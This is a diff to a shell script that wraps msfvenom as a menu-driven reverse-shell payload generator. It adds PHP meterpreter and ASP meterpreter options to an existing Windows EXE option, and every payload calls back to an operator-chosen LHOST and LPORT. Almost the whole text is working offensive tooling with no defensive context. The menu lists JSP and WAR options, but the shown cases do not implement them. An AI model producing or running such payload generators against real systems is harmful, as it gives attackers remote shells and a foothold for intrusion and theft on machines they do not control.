@@ -52,6 +52,33 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $outp
 if [ -f "$output_win" ]
 then echo "Payload saved as $output_win" 
 fi
+
+elif [ "$choice" -eq 2 ]
+then
+echo "Options:
+Option 1:PHP[0]
+===============
+Option 2:ASP[1]
+===============
+Option 3:JSP[2]
+===============
+Option 4:WAR[3]
+===============
+"
+read -p "Option~: " option 
+case $option in
+0)
+echo "PHP Reverse-Shell Payload"
+read -p "Output-filename(file.php)~: " outputphp
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputphp
+cat $outputphp | pbcopy && echo '<?php ' | tr -d '\n' > $outputphp && pbpaste >> $outputphp
+;;
+1)
+echo "ASP Payload"
+read -p "Output-filename(file.asp)~: " outputasp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $outputasp
+;;
+esac
 fi
 }
 
